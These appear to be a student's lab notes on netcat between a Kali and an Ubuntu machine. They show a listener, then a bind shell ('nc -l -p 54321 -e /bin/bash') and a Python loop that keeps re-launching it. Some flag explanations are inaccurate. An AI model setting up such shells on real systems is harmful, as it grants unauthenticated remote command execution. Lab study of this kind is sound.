- Performed on our Kali Linux Internal computer:
	- We us the **nc** (netcat) command 
	- We enter the following:
		- nc -l -p 54321
		- -l is our port to listen on 
		- -p is the port number
	- The computer will now listen on this port

- On our Ubuntu computer we perform the following:
	- nc 192.168.11.100 54321
		- The IP of our Kali Linux internal computer
		- If we enter text in either machine, the text should appear in the terminal of the receiving machines terminal 

- By using:
	- nc -l -p 54321 -e /bin/bash
- On the Kali Linux computer and running:
	- nc 192.168.11.100 54321
- On the Ubuntu computer 
- We can run commands that will execute on the Kali Linux terminal 

- To run bash code in python:
	- python
		- import os
		- while True:
			- os.system("nc -l -p 54321 -e /bin/bash")
	- Control + Z to quit loop

[[Web Services with Apache]]